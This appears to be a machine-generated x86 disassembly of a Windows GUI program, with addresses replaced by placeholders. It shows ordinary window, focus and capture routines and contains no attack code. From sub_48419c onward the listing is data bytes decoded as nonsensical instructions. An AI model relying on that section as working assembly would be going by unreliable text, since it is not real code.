cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_483438
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_483210
jmp r-xdata
mov eax [ ebx ]
movzx eax [ eax + 0xce ]
call sub_476d94
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483aab
lea eax [ ebp - 0x90 ]
mov edx 0x2
call j_sub_44936c
lea eax [ ebp - 0x44 ]
mov edx [ r-xdata ]
call sub_44a798
retn
lea eax [ ebp - 0x4c ]
mov dl 0x1
call sub_48c3fc
call sub_48038c
mov edx [ ebx ]
cmp eax [ edx + 0x5c ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
call sub_48f30c
test eax eax
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x38 ] eax
call sub_483470
add [ ebp - 0x38 ] eax
mov eax [ rw-data ]
call sub_47f604
mov [ ebp - 0x34 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x58 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
call sub_48d81c
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x54 ]
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x58 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x5c ]
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov ecx [ ebp - 0x58 ]
sub ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x5c ]
sub edx [ ebp - 0x54 ]
lea eax [ ebp - 0x2c ]
call sub_432b28
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x4c ]
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
call sub_48dac0
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
call sub_480354
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_48aa9c
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0xc ]
call sub_449d80
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
xor ecx ecx
mov edx 0xb030
call sub_48f2b0
test eax eax
sete [ ebp - 0x5d ]
cmp [ ebp - 0x5d ] 0x0
je r-xdata
cmp [ esi + 0x1cc ] 0x0
je r-xdata
cmp [ ebp - 0x5d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x162 ] 0x0
je r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ esi + 0x1cc ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x5d ]
lea edx [ ebp - 0xc ]
mov esi [ ebx ]
mov eax [ esi + 0x164 ]
call [ esi + 0x160 ]
mov edx [ ebx ]
mov [ edx + 0x54 ] al
mov eax [ ebx ]
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0xc ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x40 ]
call sub_4835c8
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
movzx edx [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x80 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x80 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x34 ]
mov esi [ eax ]
call [ esi + 0xf4 ]
lea eax [ ebp - 0x70 ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x3c ]
call sub_432b28
mov eax [ ebx ]
mov eax [ eax + 0x80 ]
mov si 0xffc7
call sub_4483f8
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x2c ]
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
call sub_48d98c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x60 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x64 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x24 ]
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
call sub_48d98c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x68 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x6c ] edx
mov eax [ ebx ]
mov eax [ eax + 0x80 ]
mov edx [ ebp - 0x30 ]
call sub_48e120
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x80 ]
mov ecx [ ebp - 0xc ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xf0 ]
call sub_4804a0
mov eax [ ebp - 0x14 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0xc ]
call sub_483628
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x10 ]
mov eax [ ebx ]
call sub_483210
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_483210
jmp r-xdata
sub_483ab4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov esi eax
xor ebx ebx
jmp r-xdata
mov eax [ esi + 0xc8 ]
call sub_44af28
cmp ebx eax
jl r-xdata
lea edi [ ebx + ebx * 2 ]
mov eax [ esi + 0xc8 ]
cmp ebp [ eax + edi * 4 + 0x4 ]
jne r-xdata
mov eax [ esi + 0xc4 ]
mov [ esp ] eax
inc [ esi + 0xc4 ]
mov eax [ esi + 0xc8 ]
call sub_44af28
cmp ebx eax
jl r-xdata
mov eax [ esi + 0xc8 ]
cmp [ eax + edi * 4 ] 0xffffffff
je r-xdata
mov eax [ esi + 0xc8 ]
mov eax [ eax + edi * 4 ]
mov [ esp ] eax
jmp r-xdata
lea eax [ ebx + ebx * 2 ]
mov edx [ esi + 0xc8 ]
mov ecx [ esp ]
mov [ edx + eax * 4 ] ecx
mov edx [ esi + 0xc8 ]
mov [ edx + eax * 4 + 0x4 ] ebp
mov edx [ esi + 0xc8 ]
cmp [ ebp + 0x34c ] 0x0
setne cl
mov [ edx + eax * 4 + 0x8 ] cl
mov eax [ esi + 0xc8 ]
call sub_44af28
mov ebx eax
lea eax [ ebx + 0x1 ]
push eax
lea eax [ esi + 0xc8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
inc ebx
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_483b7c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x60 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x4c ]
call sub_449d2c
cmp [ ebx + 0x294 ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x294 ]
call sub_449d2c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_483bb8
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
cmp [ ebx + 0xfa ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov edx esp
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
cmp [ esp ] 0x0
jne r-xdata
call GetActiveWindow
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop ebx
retn
mov eax [ ebx + 0x170 ]
push eax
call GetLastActivePopup
mov [ esp ] eax
sub_483c04
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
cmp [ ebx + 0x102 ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov edx esp
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ esp ]
pop edx
pop ebx
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
mov eax [ ebx + 0x40 ]
call sub_496868
mov [ esp ] eax
sub_483c44
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x60 ]
test edi edi
je r-xdata
mov ebp [ esi + 0x40 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_48f2b0
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_48f2b0
dec eax
je r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_451830
sub_483cdc
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xe2 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_483d04
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xea ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_483dd4
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
xor ebx ebx
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ edi ]
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov eax ebp
call sub_48a70c
mov esi eax
test esi esi
jne r-xdata
cmp ebp [ eax + 0x36c ]
jne r-xdata
test esi esi
je r-xdata
push ebp
call GetParent
mov ebp eax
test ebp ebp
je r-xdata
mov esi eax
jmp r-xdata
mov edx edi
mov eax esi
mov si 0xffb1
call sub_4483f8
mov ebx eax
mov eax ebp
call sub_48a70c
mov esi eax
test esi esi
je r-xdata
sub_483e40
push ebx
push esi
mov ebx eax
mov [ ebx + 0x30 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x40 ]
cmp eax esi
je r-xdata
mov eax [ ebx + 0x170 ]
push eax
call SetActiveWindow
mov eax ebx
call sub_480ef8
mov dl 0x1
mov eax ebx
call sub_481058
mov eax [ rw-data ]
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp [ ebx + 0x152 ] 0x0
je r-xdata
mov eax esi
call sub_496868
push eax
call SetFocus
mov eax esi
call sub_496868
mov edx 0x9
call sub_4805cc
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x154 ]
call [ ebx + 0x150 ]
sub_483ebc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_448180
mov [ edi + 0x4 ] esi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x10 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
xor eax eax
mov [ edi + 0x18 ] eax
mov [ edi + 0x28 ] 0x0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_483f10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_424dc0
pop esi
pop ebx
retn
mov eax esi
movzx edx [ eax + 0x8 ]
mov [ ebx + 0x8 ] dl
mov edx [ eax + 0xc ]
mov [ ebx + 0xc ] edx
mov edx [ eax + 0x10 ]
mov [ ebx + 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebx + 0x14 ] edx
mov edx [ eax + 0x18 ]
mov [ ebx + 0x18 ] edx
movzx eax [ eax + 0x28 ]
mov [ ebx + 0x28 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_483f68
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_48d8bc
sub eax [ ebx + 0x18 ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov esi [ ebx + 0x4 ]
mov eax esi
call sub_48d878
mov ecx eax
sub ecx [ ebx + 0x14 ]
mov edx [ ebx + 0x10 ]
mov eax [ ebx + 0xc ]
call sub_432a2c
mov edx esp
mov eax esi
call sub_47ecf0
mov edx ebx
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_483fc4
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call sub_41f780
test al al
je r-xdata
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
sub_483ffc
push ebx
push esi
push edi
add esp 0xffffffc8
mov edi edx
mov esi eax
xor ebx ebx
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax ebx
add esp 0x38
pop edi
pop esi
pop ebx
retn
call sub_41f780
test al al
je r-xdata
movzx ebx [ esi + 0x28 ]
test bl bl
jne r-xdata
mov edx esp
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x20 ]
push eax
lea edx [ esp + 0x4 ]
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_490c98
mov eax [ esp + 0x20 ]
mov [ esp ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x4 ] eax
lea eax [ esp + 0x20 ]
push eax
lea edx [ esp + 0xc ]
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_490c98
mov eax [ esp + 0x20 ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0xc ] eax
lea edx [ esp + 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x1c ]
sub eax [ esi + 0x18 ]
push eax
lea eax [ esp + 0x2c ]
push eax
mov ecx [ esp + 0x20 ]
sub ecx [ esi + 0x14 ]
mov edx [ esi + 0x10 ]
mov eax [ esi + 0xc ]
call sub_432a2c
lea esi [ esp + 0x28 ]
lea edi [ esp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx esp
lea eax [ esp + 0x10 ]
call sub_432a8c
test al al
je r-xdata
mov bl 0x1
lea edx [ esp + 0x8 ]
lea eax [ esp + 0x10 ]
call sub_432a8c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
sub_4840e0
push ebx
mov ebx eax
cmp dl [ ebx + 0x8 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x8 ] dl
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x358 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebx + 0x4 ]
call sub_47e9ac
sub_484110
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
mov [ esi + 0xc ] ecx
inc ecx
jne r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
mov [ esi + 0x10 ] ecx
inc ecx
jne r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
mov [ esi + 0x14 ] ecx
inc ecx
jne r-xdata
cmp ecx [ esi + 0x18 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
mov [ esi + 0x18 ] ecx
inc ecx
jne r-xdata
pop esi
retn
mov [ esi + 0x28 ] 0x1
sub_484170
cmp dl [ eax + 0x28 ]
je r-xdata
retn
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov [ eax + 0x28 ] dl
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ eax + 0xc ] 0xffffffff
je r-xdata
cmp [ eax + 0x10 ] 0xffffffff
je r-xdata
cmp [ eax + 0x14 ] 0xffffffff
je r-xdata
cmp [ eax + 0x18 ] 0xffffffff
je r-xdata
sub_48419c
add [ eax ] eax
add [ eax ] al
les esp [ ecx ]
dec esi
add [ edi + edx * 4 + 0x48 ] cl
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4841ff
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484206
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_476af4
mov eax sub_476dd8
call sub_4240b4
mov eax [ rw-data ]
push eax
call CloseHandle
sub_484208
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_48419c
call sub_44900c
call sub_483d2c
push r-xdata
call RegisterWindowMessageW
mov [ rw-data ] eax
mov eax sub_476dd8
call sub_424074
xor eax eax
mov [ rw-data ] eax
sub_48479f
dec eax
add [ edx + eax ] ch
dec [ eax ]
pop esp
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ss
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax ] al
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
xchg esp eax
loopne r-xdata
inc ebx
jb r-xdata
sbb al [ eax ]
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080018 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xe865646f
lea ecx [ eax ]
jo r-xdata
inc esp
jb r-xdata
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001d ] al
je r-xdata
and al 0x5c
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] eax
or eax [ edx + 0x6f ]
jb r-xdata
add bh bh
add [ eax ] al
add [ eax ] al
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
insb
inc edx
add [ edx + eax ] dl
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x44561873
add cl ah
add [ eax ] eax
inc [ edx + ebp * 2 + 0x49 ]
add [ eax + 0x6a ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001e ] al
je r-xdata
insb
adc [ gs : ebx + 0x48 ] bh
add [ eax - 0x21 ] ch
dec eax
add [ eax - 0x67ffb721 ] ah
pop es
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307001b ] al
popad
jo r-xdata
add [ eax ] al
[ eax + eax ]
jb r-xdata
add [ eax ] cl
inc esp
jb r-xdata
jne r-xdata
bound ebp [ ebp + 0x42 ]
xor eax [ eax + ebx + 0x56 ]
inc esp
add bl ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ esi ] cl
push ebp
jae r-xdata
imul ebp [ edi + 0x6e ] r-xdata
insb
add [ eax ] al
jmp [ eax ]
outsb
jae r-xdata
jl r-xdata
add eax 0x6f6c6f43
jb r-xdata
add [ ecx + 0x48 ] ch
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add bh bh
sbb al 0x0
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
je r-xdata
add [ eax ] al
add [ eax + 0x46040027 ] al
outsd
outsb
je r-xdata
dec ebp
outsd
sbb [ gs : esi + 0x44 ] dl
add [ eax + eax ] cl
jb r-xdata
cwde
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
and al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add [ eax ] eax
jmp [ ebx + ebp * 2 + 0x10049 ]
add [ eax ] dh
add bh bh
mov [ ecx + ecx * 2 ] cs
add [ ecx ] al
inc eax
pop esp
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
add [ esi ] al
push esi
inc esp
add [ esi + 0x2 ] dh
add bh bh
jbe r-xdata
add [ ecx + edx * 8 ] ch
add [ edx ] bh
add bh bh
jpe r-xdata
push [ ebp + 0x2 ]
jae r-xdata
dec [ eax ]
push ebx
dec ecx
add [ edx + ebp * 2 + 0x49 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc esp
outsd
arpl [ ebx + 0x53 ] bp
imul esi [ ebp + 0x18 ] 0x54004456
add al [ eax ]
add [ eax ] al
and [ eax ] al
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
sbb [ gs : esi + 0x44 ] dl
push esi
inc esp
add ah ah
add [ eax ] eax
call [ eax + 0x52 ]
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
sbb [ esi + 0x44 ] dl
add [ ecx + eax + 0x7e00ff00 ] dh
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50070029 ] al
popad
imul ebp [ fs : esi + 0x67 ] r-xdata
dec esp
outsd
arpl [ ebx + 0x65 ] bp
cwde
jle r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ eax ] al
push es
add bh bh
add bh bh
add [ eax ] eax
inc esp
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al [ eax ]
push cs
push eax
popad
jb r-xdata
insb
push edx
jo r-xdata
add bh bh
jne r-xdata
jb r-xdata
jb r-xdata
add al cl
add [ eax ] al
dec ecx
add [ ecx ] al
outsb
je r-xdata
pushad
add [ eax ] al
[ eax + eax ]
imul ebp [ fs : esi + 0x67 ] r-xdata
imul ebp [ esi + 0x74 ] r-xdata
add [ fs : eax ] al
jmp [ eax + 0x48 ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ es : ebx ] cl
inc esi
jne r-xdata
add bh bh
add [ eax ] 0x0
add [ eax + 0x440e0021 ] al
outsd
jne r-xdata
jpe r-xdata
jb r-xdata
add [ ebx ] cl
push eax
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax 0x61500b00
push esi
inc esp
add ch ah
add [ eax ] eax
inc [ eax + 0x100496a ]
dec eax
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
sub al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
jge r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
push esi
inc esp
add [ eax ] al
dec eax
add [ eax ] ah
add dh bh
add [ eax ] eax
add [ eax ] al
add [ ebx - 0x74010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
sub al 0xd1
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080033 ] al
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
je r-xdata
loopne r-xdata
outsb
je r-xdata
push 0x6948776f
outsb
je r-xdata
jpe r-xdata
inc esp
add [ ecx - 0x3f010000 ] cl
loopne r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax + 0x1 ] al
outsb
je r-xdata
add [ eax ] al
xor eax [ eax + ebx + 0x56 ]
inc esp
add dh ah
add [ eax ] eax
dec esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ cs : eax + edx * 2 ] dl
add [ eax ] al
das
add [ edx ] cl
push eax
popad
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
popad
jb r-xdata
add [ eax + edx * 2 ] dl
outsd
insb
outsd
add bh bh
add [ edx + ebp * 2 + 0x6b2c0049 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax 0x61540700
add [ eax + 0x48e0 ] cl
jo r-xdata
inc [ edi + ebx * 8 + 0x48 ]
pop ds
inc esi
add [ eax + eax ] bh
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
popad
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
outsb
je r-xdata
loopne r-xdata
jo r-xdata
adc ecx [ edi + 0x6e ]
inc ecx
insb
imul esp [ edi + 0x6e ] 0x65736e49
jb r-xdata
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add [ ss : ecx ] dl
push esi
jb r-xdata
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
dec ecx
add [ ebx + ebp * 2 ] ch
adc eax [ edx ]
jns r-xdata
pop esi
imul ebp [ edi + 0x6e ] r-xdata
mov [ eax ] eax
add bh bh
shl al 0x48
add [ eax ] eax
add [ eax ] al
jb r-xdata
push eax
popad
jb r-xdata
add [ esi ] cl
push esi
inc esp
add [ edx - 0x1b010000 ] cl
loopne r-xdata
xor [ eax ] al
push cs
add [ eax + 0x1 ] al
outsd
jne r-xdata
inc [ ebx + ebp * 2 + 0x49 ]
add [ ecx ] al
add bh bh
inc esp
imul ecx [ ecx ] 0x1
outsb
jne r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
mov eax 0xb8ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f13003c ] al
outsb
inc ebx
outsd
inc edx
outsw
jb r-xdata
cmp [ ecx ] 0x0
cmovg ebp [ esi + 0x41 ]
insb
imul esp [ edi + 0x6e ] 0x69736f50
je r-xdata
imul esp [ ebx + 0x61 ] 0x696c416c
outsb
insd
outsb
je r-xdata
jl r-xdata
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ edi ] al
push esp
popad
push esi
inc esp
add al ah
add [ eax ] eax
xor al [ eax ]
or edx [ ebx + 0x68 ]
outsd
ja r-xdata
add bh bh
push esp
pop esp
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
insb
inc edx
jne r-xdata
add [ ebx ] cl
push ebx
push 0x6143776f
push esi
inc esp
add [ eax + 0x2 ] bh
or cl [ edi + 0x6e ]
jb r-xdata
add [ eax ] al
cmp [ ebx ] 0x0
pop es
dec edi
outsb
inc ebx
movsb [ edi ] [ esi ]
outsb
jae r-xdata
outsd
outsb
and [ ebp + 0xb00048 ] al
add bh bh
mov al 0x0
add bh bh
add [ eax ] eax
